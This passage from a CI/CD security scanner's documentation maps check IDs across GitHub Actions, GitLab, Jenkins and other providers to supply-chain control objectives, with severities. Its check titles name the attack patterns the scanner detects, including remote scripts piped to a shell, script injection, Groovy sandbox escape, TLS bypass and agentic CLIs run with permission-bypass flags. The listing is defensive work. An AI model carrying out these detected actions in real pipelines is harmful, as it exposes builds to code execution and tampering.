| [`BK-003`](#detail-bk-003) | Untrusted Buildkite variable interpolated in command | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-015`](#detail-bk-015) | agents map interpolates attacker-controllable Buildkite variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-011`](#detail-cb-011) | CodeBuild buildspec contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-002`](#detail-cc-002) | Script injection via untrusted environment variable | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-012`](#detail-cc-012) | Dynamic config via `setup: true` enables code injection | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-025`](#detail-cc-025) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-026`](#detail-cc-026) | Config contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-027`](#detail-cc-027) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-005`](#detail-df-005) | RUN uses shell-eval (eval / sh -c on a variable / backticks) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-003`](#detail-dr-003) | Untrusted Drone template variable in shell command | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-009`](#detail-dr-009) | Cache plugin key embeds an attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-011`](#detail-dr-011) | node map interpolates attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`GCB-014`](#detail-gcb-014) | Build logging disabled (options.logging: NONE) | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-022`](#detail-gcb-022) | options.substitutionOption set to ALLOW_LOOSE | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-003`](#detail-gha-003) | Script injection via untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-009`](#detail-gha-009) | workflow_run downloads upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-010`](#detail-gha-010) | Local action (./path) on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-011`](#detail-gha-011) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-013`](#detail-gha-013) | issue_comment trigger without author guard | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-027`](#detail-gha-027) | Workflow contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-028`](#detail-gha-028) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-031`](#detail-gha-031) | Workflow uses retired set-output / save-state command | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-032`](#detail-gha-032) | run: invokes local script on untrusted-trigger workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-035`](#detail-gha-035) | github-script step interpolates untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-036`](#detail-gha-036) | runs-on interpolates untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-038`](#detail-gha-038) | Workflow re-enables retired ::set-env / ::add-path commands | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-044`](#detail-gha-044) | Build tool runs lifecycle scripts on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-045`](#detail-gha-045) | Caller-controlled ref input feeds actions/checkout | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-046`](#detail-gha-046) | Manual PR-head fetch on untrusted-trigger workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-052`](#detail-gha-052) | actions/cache key includes untrusted PR-controllable input | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-053`](#detail-gha-053) | if: predicate evaluates attacker-controllable context as expression | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-058`](#detail-gha-058) | Agentic CLI invoked with permission-bypass flags | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-010`](#detail-gl-010) | Multi-project pipeline ingests upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-011`](#detail-gl-011) | include: local file pulled in MR-triggered pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-012`](#detail-gl-012) | Cache key derives from MR-controlled CI variable | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-025`](#detail-gl-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-026`](#detail-gl-026) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-032`](#detail-gl-032) | tags: interpolates untrusted CI variable | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-033`](#detail-gl-033) | Global before_script / after_script propagates taint to every job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-002`](#detail-jf-002) | Script step interpolates attacker-controllable env var | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-013`](#detail-jf-013) | copyArtifacts ingests another job's output unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-019`](#detail-jf-019) | Groovy sandbox escape pattern detected | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-030`](#detail-jf-030) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-032`](#detail-jf-032) | Agent label interpolates attacker-controllable value | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`TAINT-001`](#detail-taint-001) | Untrusted input flows across step boundaries via step outputs | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`TAINT-002`](#detail-taint-002) | Untrusted input flows across jobs via ``jobs.<id>.outputs:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`TAINT-003`](#detail-taint-003) | Untrusted input forwarded into reusable workflow ``with:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`TAINT-004`](#detail-taint-004) | Untrusted input flows across jobs via dotenv artifact | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`TAINT-005`](#detail-taint-005) | Untrusted input flows across steps via ``buildkite-agent meta-data`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`TAINT-006`](#detail-taint-006) | Untrusted input flows across tasks via Tekton ``results`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TAINT-007`](#detail-taint-007) | Untrusted input flows across templates via Argo ``outputs.parameters`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`TAINT-008`](#detail-taint-008) | Untrusted input flows via GitLab ``extends:`` template inheritance | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`TKN-003`](#detail-tkn-003) | Tekton param interpolated unsafely in step script | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-015`](#detail-tkn-015) | Workspace subPath interpolates a Task parameter (path traversal) | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |

### ESF-D-TAMPER: Protect build artifacts from tampering and detect unauthorized modification { #ctrl-esf-d-tamper }

**Evidenced by 6 checks** across 3 providers (GitHub Actions, Jenkins, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`GHA-048`](#detail-gha-048) | Workflow step writes a file under .github/workflows/ | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`JF-027`](#detail-jf-027) | `archiveArtifacts` does not record a fingerprint | <span class="pg-sev pg-sev--low">LOW</span> | [Jenkins](../providers/jenkins.md) |  |
| [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-036`](#detail-scm-036) | Active ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-043`](#detail-scm-043) | Tag-targeted ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-044`](#detail-scm-044) | Default-branch signed-commits requirement bypassed for admins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### ESF-S-VERIFY-DEPS: Verify third-party and open-source dependencies before use { #ctrl-esf-s-verify-deps }

**Evidenced by 98 checks** across 18 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, OCI manifest, SCM, Tekton, maven).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-010`](#detail-ado-010) | Cross-pipeline `download:` ingestion unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-012`](#detail-ado-012) | Cache@2 key derives from $(System.PullRequest.*) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-016`](#detail-ado-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-018`](#detail-ado-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-023`](#detail-ado-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-025`](#detail-ado-025) | Cross-repo template not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-026`](#detail-ado-026) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-028`](#detail-ado-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-014`](#detail-argo-014) | Argo template script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-010`](#detail-bb-010) | Deploy step ingests pull-request artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-012`](#detail-bb-012) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-014`](#detail-bb-014) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-018`](#detail-bb-018) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-023`](#detail-bb-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-025`](#detail-bb-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-027`](#detail-bb-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-029`](#detail-bb-029) | image: (step or service) not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-030`](#detail-bb-030) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-031`](#detail-bb-031) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-014`](#detail-bk-014) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CB-009`](#detail-cb-009) | CodeBuild image not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CB-011`](#detail-cb-011) | CodeBuild buildspec contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-016`](#detail-cc-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-018`](#detail-cc-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-023`](#detail-cc-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-025`](#detail-cc-025) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-026`](#detail-cc-026) | Config contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-028`](#detail-cc-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-029`](#detail-cc-029) | Machine executor image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-009`](#detail-df-009) | ADD used where COPY would suffice | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-022`](#detail-df-022) | RUN uses npm install instead of npm ci | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-008`](#detail-dr-008) | Step uses ``pull: never`` (skips registry verification) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-010`](#detail-dr-010) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-004`](#detail-gcb-004) | dynamicSubstitutions on with user substitutions in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-011`](#detail-gcb-011) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-009`](#detail-gha-009) | workflow_run downloads upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-011`](#detail-gha-011) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-016`](#detail-gha-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-018`](#detail-gha-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-023`](#detail-gha-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-025`](#detail-gha-025) | Reusable workflow not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-027`](#detail-gha-027) | Workflow contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-029`](#detail-gha-029) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-041`](#detail-gha-041) | Action upstream repo has a single contributor | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-042`](#detail-gha-042) | Action upstream repo is newly created | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-043`](#detail-gha-043) | Low-star action runs with sensitive permissions | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-047`](#detail-gha-047) | Action ref resolves to a recently committed tag or SHA | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-051`](#detail-gha-051) | services / container image is not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-056`](#detail-gha-056) | Workflow body contains a known supply-chain worm indicator | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-059`](#detail-gha-059) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-060`](#detail-gha-060) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-010`](#detail-gl-010) | Multi-project pipeline ingests upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-012`](#detail-gl-012) | Cache key derives from MR-controlled CI variable | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-016`](#detail-gl-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-018`](#detail-gl-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-023`](#detail-gl-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-025`](#detail-gl-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-027`](#detail-gl-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-028`](#detail-gl-028) | services: image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-030`](#detail-gl-030) | trigger: include: pulls child pipeline without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-034`](#detail-gl-034) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-035`](#detail-gl-035) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-005`](#detail-helm-005) | Chart maintainers field empty or missing chain-of-custody info | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-007`](#detail-helm-007) | Chart.yaml description field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-010`](#detail-helm-010) | Chart.yaml appVersion field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-001`](#detail-jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-012`](#detail-jf-012) | `load` step pulls Groovy from disk without integrity pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-013`](#detail-jf-013) | copyArtifacts ingests another job's output unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-016`](#detail-jf-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-018`](#detail-jf-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-023`](#detail-jf-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-031`](#detail-jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-001`](#detail-k8s-001) | Container image not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`MVN-005`](#detail-mvn-005) | Maven repository accepts artifacts without strict checksum gating | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [maven](../providers/maven.md) |  |
| [`MVN-006`](#detail-mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [maven](../providers/maven.md) |  |
| [`OCI-007`](#detail-oci-007) | Image manifest uses legacy schemaVersion 1 (no content addressing) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-008`](#detail-oci-008) | Manifest references digest using unsupported hash algorithm | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
